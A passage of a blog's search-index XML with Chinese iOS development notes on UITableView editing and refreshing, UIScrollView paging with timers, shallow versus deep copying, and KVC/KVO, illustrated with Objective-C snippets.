重写initWithStyle:reuseIdentifier:方法添加所有需要显示的子控件(不需要设置子控件的数据和frame,子控件要添加到contentView中)进行子控件一次性的属性设置(有些属性只需要设置一次, 比如字体\固定的图片) 提供2个模型 数据模型: 存放文字数据\图片数据 frame模型: 存放数据模型\所有子控件的frame\cell的高度 cell拥有一个frame模型(不要直接拥有数据模型) (重写set方法) 重写frame模型属性的setter方法: 在这个方法中设置子控件的显示数据和frame frame模型数据的初始化已经采取懒加载的方式(每一个cell对应的frame模型数据只加载一次) 数据刷新 添加数据 删除数据 更改数据 全局刷新方法(最常用) 屏幕上的所有可视的cell都会刷新一遍 1[self.tableView reloadData]; 局部刷新方法 添加数据 123NSArray *indexPaths = @[[NSIndexPath indexPathForRow:0 inSection:0], [NSIndexPath indexPathForRow:1 inSection:0]];[self.tableView insertRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationRight]; 删除数据 123NSArray *indexPaths = @[[NSIndexPath indexPathForRow:0 inSection:0], [NSIndexPath indexPathForRow:1 inSection:0]];[self.tableView deleteRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationMiddle]; 更新数据（没有添加和删除数据，仅仅是修改已经存在的数据） 123NSArray *indexPaths = @[[NSIndexPath indexPathForRow:0 inSection:0], [NSIndexPath indexPathForRow:1 inSection:0]];[self.tableView relaodRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationMiddle]; 左滑出现删除按钮 需要实现tableView的代理方法 1234567891011121314151617181920/** * 只要实现了这个方法，左滑出现Delete按钮的功能就有了 * 点击了“左滑出现的Delete按钮”会调用这个方法 */- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath&#123; // 删除模型 [self.wineArray removeObjectAtIndex:indexPath.row]; // 刷新 [tableView deleteRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft];&#125;/** * 修改Delete按钮文字为“删除” */- (NSString *)tableView:(UITableView *)tableView titleForDeleteConfirmationButtonForRowAtIndexPath:(NSIndexPath *)indexPath&#123; return @"删除";&#125; 左滑出现N个按钮 需要实现tableView的代理方法 12345678910111213141516171819202122232425/** * 只要实现了这个方法，左滑出现按钮的功能就有了 (一旦左滑出现了N个按钮，tableView就进入了编辑模式, tableView.editing = YES) */- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath &#123;&#125;/** * 左滑cell时出现什么按钮 */- (NSArray *)tableView:(UITableView *)tableView editActionsForRowAtIndexPath:(NSIndexPath *)indexPath&#123; UITableViewRowAction *action0 = [UITableViewRowAction rowActionWithStyle:UITableViewRowActionStyleNormal title:@"关注" handler:^(UITableViewRowAction *action, NSIndexPath *indexPath) &#123; NSLog(@"点击了关注"); // 收回左滑出现的按钮(退出编辑模式) tableView.editing = NO; &#125;]; UITableViewRowAction *action1 = [UITableViewRowAction rowActionWithStyle:UITableViewRowActionStyleDefault title:@"删除" handler:^(UITableViewRowAction *action, NSIndexPath *indexPath) &#123; [self.wineArray removeObjectAtIndex:indexPath.row]; [tableView deleteRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationAutomatic]; &#125;]; return @[action1, action0];&#125; 进入编辑模式123// self.tabelView.editing = YES;[self.tableView setEditing:YES animated:YES];// 默认情况下，进入编辑模式时，左边会出现一排红色的“减号”按钮 在编辑模式中多选1234567// 编辑模式的时候可以多选self.tableView.allowsMultipleSelectionDuringEditing = YES;// 进入编辑模式[self.tableView setEditing:YES animated:YES];// 获得选中的所有行self.tableView.indexPathsForSelectedRows;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>UITableView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发常用控件之UIScrollView]]></title>
    <url>%2Farchives%2F44d78c0d.html</url>
    <content type="text"><![CDATA[常用属性1234567891011121314151617181920@property(nonatomic) CGPoint contentOffset;// 这个属性用来表示UIScrollView滚动的位置@property(nonatomic) CGSize contentSize;// 这个属性用来表示UIScrollView内容的尺寸，滚动范围（能滚多远）@property(nonatomic) UIEdgeInsets contentInset;// 这个属性能够在UIScrollView的4周增加额外的滚动区域@property(nonatomic) BOOL bounces;// 设置UIScrollView是否需要弹簧效果@property(nonatomic,getter=isScrollEnabled) BOOL scrollEnabled;// 设置UIScrollView是否能滚动@property(nonatomic) BOOL showsHorizontalScrollIndicator;// 是否显示水平滚动条@property(nonatomic) BOOL showsVerticalScrollIndicator;// 是否显示垂直滚动条 UIScrollView的使用步骤 创建UIScrollView 给UIScrollView添加子控件 要想UIScrollView可以滚动,必须设置UIScrollView的滚动范围 12// 设置滚动范围self.scrollview.contentSize = CGSizeMake(500, 500); 注意点 千万不要使用subviews来获取UIScrollview中的子控件。 因为subviews中包含了UIScrollview中的滚动条，而且滚动条的顺序是不确定的。 默认情况下只要UIScrollview可以滚动, 就有弹簧效果 bounces属性用于设置UIScrollview是否有回弹效果 1self.scrollview.bounces = NO; 注意: alwaysBounceXXX属性主要用于设置UIScrollview没有设置contentSize的情况 如果UIScrollview已经设置了contentSize，那么YES和NO没有区别 alwaysBounceXXX应用场景: 下拉刷新 12self.scrollview.alwaysBounceVertical = YES;self.scrollview.alwaysBounceHorizontal = YES; 设置滚动条的样式和控制滚动条的显示 12345// 样式self.scrollview.indicatorStyle = UIScrollViewIndicatorStyleWhite;// 是否显示self.scrollview.showsHorizontalScrollIndicator = NO;self.scrollview.showsVerticalScrollIndicator = NO; contentOffset 只要点击了控制器的view系统就会自动调用下面方法 12345678910111213141516171819- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event&#123; // 1.修改UIScrollview的contentOffset属性 /* // contentOffset就是用于设置内容的滚动偏移位 // 规律: 移动的距离 = "控件的左上角" - "内容的左上角" // x等于负数 --&gt; 右边移动 // x等于整数 --&gt; 左边移动 // y等于负数 --&gt; 下边移动 // y等于整数 --&gt; 上边移动 // -100 = "控件的左上角" - "内容的左上角" // 100 = "控件的左上角" - "内容的左上角"// self.scrollview.contentOffset = CGPointMake(-100, 0);// self.scrollview.contentOffset = CGPointMake(100, 0);// self.scrollview.contentOffset = CGPointMake(0, -100); */ self.scrollview.contentOffset = CGPointMake(0, 100);&#125; 代理 UIScrollView停止”拖拽”时调用 注意：停止拖拽并不代表停止滚动,也就是说UIScrollView滚动是有惯性的\在scrollViewDidEndDragging方法中,是没有办法准确的监听到UIScrollView什么时候停止滚动。 decelerate等于YES代表有惯性, 会继续滚动; 如果等于NO代表没有惯性，会停止滚动。 123456789- (void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate&#123; NSLog(@"%s = %d", __func__, decelerate); // 判断是否有惯性,如果没有惯性手动调用scrollViewDidEndDecelerating告知已经完全停止滚动 if (decelerate == NO) &#123; [self scrollViewDidEndDecelerating:scrollView]; &#125;&#125; UIScrollView停止”减速”时调用 scrollViewDidEndDecelerating不一定会调用, 只有scrollView有惯性的时候才会调用 123456- (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView&#123; NSLog(@"%s", __func__); NSLog(@"停止滚动"); self.iv.alpha = 1.0;&#125; UIScrollview缩放 步骤: 成为UIScrollview的代理, 通过代理方法告诉UIScrollview要缩放哪一个子控件 设置子控件最大和最小的缩放比例 常用方法 viewForZoomingInScrollView : 返回需要缩放的子控件 scrollViewDidZoom: 只要子控件被缩放了就会调用(调用频率非常高) scrollViewDidEndZooming: 缩放完毕时掉用 如何保证被缩放的子控件永远居中 只要子控件的contentSize小于UIScrollview的宽高时才需要缩放 第一种123456789101112// 1.判断contentSize的宽高, 是否小于UIScrollView的frame的size if (scrollView.contentSize.width &lt; scrollView.bounds.size.width) &#123; self.iv1.center = CGPointMake(scrollView.bounds.size.width * 0.5, scrollView.bounds.size.height * 0.5); &#125; if (scrollView.contentSize.height &lt; scrollView.bounds.size.height) &#123; self.iv1.center = CGPointMake(scrollView.bounds.size.width * 0.5, scrollView.bounds.size.height * 0.5); &#125; 第二种123456789101112131415161718// 1.判断contentSize的宽高, 是否小于UIScrollView的frame的size if (scrollView.contentSize.width &lt; scrollView.bounds.size.width) &#123; // 计算X的值 CGFloat x = (scrollView.contentSize.width * 0.5) + ((scrollView.bounds.size.width - scrollView.contentSize.width) * 0.5); // 重新设置center self.iv1.center = CGPointMake(x, self.iv1.center.y); &#125; if (scrollView.contentSize.height &lt; scrollView.bounds.size.height) &#123; // 计算Y的值 CGFloat y = (scrollView.contentSize.height * 0.5) + ((scrollView.bounds.size.height - scrollView.contentSize.height) * 0.5); // 重新设置center self.iv1.center = CGPointMake(self.iv1.center.x, y); &#125; 第三种 (对第二种方法进行简化)123CGFloat x = scrollView.contentSize.width &lt; scrollView.bounds.size.width ? (scrollView.bounds.size.width - scrollView.contentSize.width) * 0.5 : 0.0; CGFloat y = scrollView.contentSize.height &lt; scrollView.bounds.size.height ? (scrollView.bounds.size.height - scrollView.contentSize.height) * 0.5 : 0.0; self.iv1.center = CGPointMake(scrollView.contentSize.width * 0.5 + x, scrollView.contentSize.height * 0.5 + y); 图片轮播器 如何分页 : pagingEnabled = YES 分页的原理: 是根据UIScrollview的宽度或者高度来分页 UIPageControl numberOfPages : 设置总页码 currentPage: 设置当前页码 pageIndicatorTintColor: 设置其它页码的颜色 currentPageIndicatorTintColor : 设置当前页码的颜色 自定义页码 利用KVC给UIPageControl设置页码图片(私有属性) 12[pageControl setValue:[UIImage imageNamed:@"current"] forKeyPath:@"_currentPageImage"]; [pageControl setValue:[UIImage imageNamed:@"other"] forKeyPath:@"_pageImage"]; 监听UIPageControl的点击 由于UIPageControl继承于UIControl, 所以通过addTargt来监听 1[pageControl addTarget:self action:@selector(nextPage) forControlEvents:UIControlEventValueChanged]; 切换页码 滚动完毕之后再切换 12345678910111213141516171819- (void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate&#123; // 判断是否有惯性, 如果没有就手动调用scrollViewDidEndDecelerating if (NO == decelerate) &#123; [self scrollViewDidEndDecelerating:scrollView]; &#125;&#125;// 只有有惯性才会调用- (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView&#123; // 1.动态计算当前的页码 // 页码 = UIScrollView的偏移位 / UIScrollView的宽度 int page = scrollView.contentOffset.x / scrollView.bounds.size.width; NSLog(@"page = %d", page); // 2.设置当前的页码 self.pageControl.currentPage = page;&#125; 实时切换 （原理相同 实现方式不同的方法） 方式1 123456789101112// 只要滚动就会调用- (void)scrollViewDidScroll:(UIScrollView *)scrollView&#123;// NSLog(@"%s", __func__); // 1.动态计算当前的页码 // 页码 = UIScrollView的偏移位 / UIScrollView的宽度 CGFloat page = scrollView.contentOffset.x / scrollView.bounds.size.width; NSLog(@"page = %f", page + 0.5); // 2.设置当前的页码 self.pageControl.currentPage = (int)(page + 0.5);&#125; 方式2 123456789// 当正在滚动的时候就会调用代理的方法- (void)scrollViewDidScroll:(UIScrollView *)imageScrollView&#123; // 根据滚动的位置计算出当前的页数 CGFloat scrollViewW = self.imageScrollView.frame.size.width; int page = (imageScrollView.contentOffset.x + scrollViewW * 0.5) / scrollViewW; self.pageControl.currentPage = page;&#125; NSTimer的使用 作用: 可以让系统每隔一段时间执行指定对象的指定方法 注意: 间隔时间是不准确的 只要通过scheduledTimerWithTimeInterval创建出来的Timer,就会被RUNLOOP强引用, 所以如果通过属性保存使用weak 只要调用了NSTimer的invalidate方法, 那么定时器就不能使用了, 想要使用必须重新创建 如何主线程正在处理其它操作, 那么NSTimer不会执行 默认NSTimer是NSDefaultRunLoopMode模式 要想在主线程处理其它操作的时候也处理NSTimer, 那么必须把NSTiemr在RunLoop中的模式改为NSRunLoopCommonModes开启定时器 12345678@property (nonatomic, weak) NSTimer *timer;// 返回一个自动开始执行任务的定时器self.timer = [NSTimer scheduledTimerWithTimeInterval:2.0 target:self selector:@selector(nextPage:) userInfo:@"123" repeats:YES];// 修改NSTimer在NSRunLoop中的模式：NSRunLoopCommonModes// 主线程不管在处理什么操作，都会抽时间处理NSTimer[[NSRunLoop mainRunLoop] addTimer:self.timer forMode:NSRunLoopCommonModes]; 12345 // 开启定时器(方式2) // 设置定时器的开始时间为过去的某一个时间, 也就意味着立刻开始// [self.timer setFireDate:[NSDate distantPast]];// 设置定时器从当前时间之后两秒才开始执行 [self.timer setFireDate:[NSDate dateWithTimeIntervalSinceNow:2.0]]; 关闭定时器(销毁) 这种的性能不好 每次都要重启 1[self.timer invalidate]; 暂停定时器(可以采用这种) 123 // 设置timer的开始时间为 遥远的未来 4001// NSLog(@"%@", [NSDate distantFuture]); [self.timer setFireDate:[NSDate distantFuture]]; 封装的思想 只要发现控制器知道得太多,就要考虑重构代码 只要发现一个效果很多地方都需要使用, 就要考虑封装]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>UIScrollView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之关于浅拷贝和深拷贝]]></title>
    <url>%2Farchives%2Fa1e080e.html</url>
    <content type="text"><![CDATA[深拷贝和浅拷贝是以是否产生新对象为依据的,不是以拷贝产生的副本类型为依据的。 拷贝 实现拷贝的方法有2个 copy：返回不可变副本 mutableCopy：返回可变副本 普通对象实现拷贝的步骤 遵守NSCopying协议 实现-copyWithZone:方法 创建新对象 给新对象的属性赋值 copy语法目的：改变副本的时候 不会改变源对象。 深拷贝和浅拷贝 深拷贝 (mutableCopy)是内容拷贝，会产生一个新的对象 新对象的计数器为1，源对象不会改变 浅拷贝 (copy) 指针拷贝 不会产生新的对象 源对象的计数器+1 copy产生的是不可变副本 由于源对象本身就不可变为了性能着想，copy会直接返回源对象本身 不可变对象调用拷贝 浅拷贝不可变 深拷贝可变 可变对象 调用拷贝 都是深拷贝 所以只有一种情况是浅拷贝: 不可变对象调用copy方法时 在浅拷贝的情况下 copy就相当于retain 注意深拷贝和浅拷贝是以是否产生新对象为一局的,不是以拷贝产生的副本类型为依据的。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>copy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之KVO和KVC常用方法]]></title>
    <url>%2Farchives%2F5a324ffa.html</url>
    <content type="text"><![CDATA[KVC可以通过Key直接访问对象的属性，或者给对象的属性赋值。而不需要调用明确的存取方法。这样就可以在运行时动态地访问和修改对象的属性、而不是在编译时确定。KVO则是对目标对象的某属性添加观察，当该属性发生变化时，通过触发观察者对象实现的KVO接口方法，来自动的通知观察者。 KVC 全称：Key Value Coding（键值编码） 本质 : 通过set方法修改成员变量属性的值(和调用set方法修改值是一样的) 而且可以修改私有成员变量的值(包括系统的私有成员变量) 而且会自动转换类型(只用于简单的转换) 赋值 1234// 能修改私有成员变量- (void)setValue:(id)value forKey:(NSString *)key;- (void)setValue:(id)value forKeyPath:(NSString *)keyPath;- (void)setValuesForKeysWithDictionary:(NSDictionary *)keyedValues; 取值 1234// 能取得私有成员变量的值- (id)valueForKey:(NSString *)key;- (id)valueForKeyPath:(NSString *)keyPath;- (NSDictionary *)dictionaryWithValuesForKeys:(NSArray *)keys; 私有属性赋值 利用KVC给UIPageControl设置页码图片 12[pageControl setValue:[UIImage imageNamed:@"current"] forKeyPath:@"_currentPageImage"];[pageControl setValue:[UIImage imageNamed:@"other"] forKeyPath:@"_pageImage"]; 比较实用的方法123456789101112131415161718 XSBook *book1 = [[XSBook alloc] init]; book1.name = @"5分钟突破iOS开发"; book1.price = 10.7; XSBook *book2 = [[XSBook alloc] init]; book2.name = @"4分钟突破iOS开发"; book2.price = 109.7; XSBook *book3 = [[XSBook alloc] init]; book3.name = @"1分钟突破iOS开发"; book3.price = 1580.7; p.books = @[book1, book2, book3]; // 如果valueForKeyPath:方法的调用者是数组，那么就是去访问数组元素的属性值 // 取得books数组中所有XSBook对象的name属性值，放在一个新的数组中返回// NSArray *names = [p valueForKeyPath:@"books.name"];// NSArray *names = [p.books valueForKeyPath:@"name"]; 不常用的方法123456789// 计算数量NSLog(@"%@", [p.books valueForKeyPath:@"@count"]);NSLog(@"%@", [p valueForKeyPath:@"books.@count"]);// 计算里面最大值NSLog(@"%@", [p.books valueForKeyPath:@"@max.price"]);// 计算里面最小值NSLog(@"%@", [p.books valueForKeyPath:@"@min.price"]);// 计算里面平均值NSLog(@"%@", [p.books valueForKeyPath:@"@avg.price"]); KVO 全称：Key Value Observing（键值监听） 作用：监听模型的属性值改变 步骤 添加监听器 12345// 为对象p添加一个观察者（监听器）// Observer：观察者（监听器）// KeyPath：属性名（需要监听哪个属性）// 利用b对象来监听a对象name属性的改变[a addObserver:b forKeyPath:@"name" options:NSKeyValueObservingOptionOld | NSKeyValueObservingOptionNew context:@"test"]; 在监听器中实现监听方法 123456789101112/** * 当利用KVO监听到某个对象的属性值发生了改变，就会自动调用这个 * * @param keyPath 哪个属性被改了 * @param object 哪个对象的属性被改了 * @param change 改成咋样 * @param context 当初addObserver时的context参数值 */-(void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context&#123; NSLog(@"%@ %@ %@ %@", object, keyPath, change, context);&#125;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>KVC</tag>
        <tag>KVO</tag>
      </tags>
  </entry>
</search>
